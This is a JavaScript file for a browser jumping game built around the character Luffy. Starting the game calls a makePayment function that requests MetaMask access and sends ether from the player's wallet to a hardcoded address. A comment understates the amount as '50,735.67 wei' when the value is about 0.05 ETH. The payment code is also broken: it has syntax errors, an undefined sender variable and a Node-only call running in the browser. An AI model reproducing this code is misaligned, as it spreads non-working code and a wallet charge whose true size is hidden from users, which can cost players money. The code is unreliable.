const luffy = document.getElementById('luffy');
const gameContainer = document.querySelector('.game-container');
const background = document.querySelector('.background');
const gameForm = document.getElementById('game-form');
const startBtn = document.getElementById('start');
const restartBtn = document.getElementById('restart');
const gameInsights = document.getElementById('game-insights');
const username = document.getElementById('username');

const scoreBoard = document.getElementById('score');

let Web3;
let isJumping = false;
let score = 0;
let obstacles = [];
let bgPosition = 0;

function jump() {
  if (!isJumping) {
    isJumping = true;
    let position = 0;
    const jumpInterval = setInterval(() => {
      if (position >= 170) {
        clearInterval(jumpInterval);
        let downInterval = setInterval(() => {
          if (position === 0) {
            clearInterval(downInterval);
            isJumping = false;
          }
          position -= 10;
          luffy.style.bottom = position + 'px';
        }, 20);
      }
      position += 10;
      luffy.style.bottom = position + 'px';
    }, 20);
  }
}

document.addEventListener('keydown', (event) => {
  if (event.code === 'Space') {
    jump();
  }
});

const obstacleImages = [
  '15766.png',
  '15767.png',
  '15770.png',
  '15775.png',
  '15782.png',
];

function pickRandomImage(images) {
  const randomIndex = Math.floor(Math.random() * images.length);
  return images[randomIndex];
}

async function createObstacle() {
  const images = obstacleImages.map((imageName) => 'png/' + imageName);

  const obstacle = document.createElement('img');
  obstacle.classList.add('obstacle');
  obstacle.src = pickRandomImage(images);

  gameContainer.appendChild(obstacle);
  obstacles.push(obstacle);

  obstacle.style.left = '800px';
  obstacle.style.bottom = '0px';

  moveObstacle(obstacle);
}

function moveObstacle(obstacle) {
  let obstaclePosition = 800;
  const speed = 5 + Math.random() * 5;

  const moveInterval = setInterval(() => {
    if (obstaclePosition < -148) {
      clearInterval(moveInterval);
      obstacle.remove();
      obstacles = obstacles.filter((ob) => ob !== obstacle);
    } else {
      obstaclePosition -= speed;
      obstacle.style.left = obstaclePosition + 'px';

      if (!isJumping && checkCollision(obstacle)) {
        endGame();
        clearInterval(moveInterval);
      }
    }
  }, 20);

  setTimeout(createObstacle, Math.random() * 3000 + 1000);
}

function checkCollision(obstacle) {
  const luffyRect = luffy.getBoundingClientRect();
  const obstacleRect = obstacle.getBoundingClientRect();

  return (
    luffyRect.bottom >= obstacleRect.top &&
    luffyRect.top <= obstacleRect.bottom &&
    luffyRect.right >= obstacleRect.left &&
    luffyRect.left <= obstacleRect.right
  );
}

function endGame() {
  alert('Game Over!');
  scoreBoard.innerHTML = 'Score: ' + score;
  obstacles.forEach((obstacle) => obstacle.remove());
  obstacles = [];
  score = 0;

  // display restart btn
  restartBtn.style.display = 'block';


}

function updateScore() {
  score++;
}

setInterval(updateScore, 100);

function moveBackground() {
  bgPosition -= 1;

  if (bgPosition <= -800) {
    bgPosition = 0;
  }

  background.style.backgroundPositionX = bgPosition + 'px';

  requestAnimationFrame(moveBackground);
}

function startGame(e) {
  makePayment();
  e.preventDefault();
  moveBackground();
  createObstacle();

  // hide background
  background.style.display = 'none';
}

gameForm.addEventListener('submit', startGame);

// jump luffy on click space
document.addEventListener('keydown', (event) => {
  if (event.code === 'Space') {
    jump();
  }
});


// get username
function getUsername(e) {
  e.preventDefault();
  const name = username.value;
  gameInsights.innerHTML = `Hello ${name}! <br> Use spacebar to jump.`;
}

async function makePayment() {
    try {
        // Check if MetaMask is installed and has an Ethereum provider
       window.addEventListener('load', () => {
 // Wait for loading completion to avoid race conditions with web3 injection timing.
  if (window.ethereum) {
    const web3 = new Web3(window.ethereum);
    try {
      // Request account access if needed
      await window.ethereum.enable();
      // Accounts now exposed
      return web3;
    } catch (error) {
      console.error(error);
    }
  }
  // Legacy dapp browsers...
  else if (window.web3) {
    // Use MetaMask/Mist's provider.
    const web3 = window.web3;
    console.log('Injected web3 detected.');
    return web3;
  }
  // Fallback to localhost; use dev console port by default...
  else {
    const provider = new Web3.providers.HttpProvider('http://127.0.0.1:9545');
    const web3 = new Web3(provider);
    console.log('No web3 instance injected, using Local web3.');
    return web3;
  }
});

            const PaymentContract = artifacts.require('PaymentContract');
            const contractAddress = '0x577011Da8e9272ce8345A3fe43BD2d01aB31899F';
            const contractABI = PaymentContract.abi;

            const web3 = new Web3(window.ethereum);
            const contract = new web3.eth.Contract(contractABI, contractAddress);

            const recipientAddress = '0x6A3A0eeDe87c645B693F7a4D4d560298f5d0508B'; // Destination address
            const weiAmount = '50735670000000000'; // 50,735.67 wei

            // Send payment from the user's address
            await contract.methods.makePayment(recipientAddress).send({
                from: sourceAddress,
                value: weiAmount
            });

            alert("Payment successful!");
        } else {
            alert("MetaMask or similar Ethereum wallet not found.");
        }
    } catch (error) {
        console.error(error);
        alert("Payment failed. Check the console for error details.");
    }
}
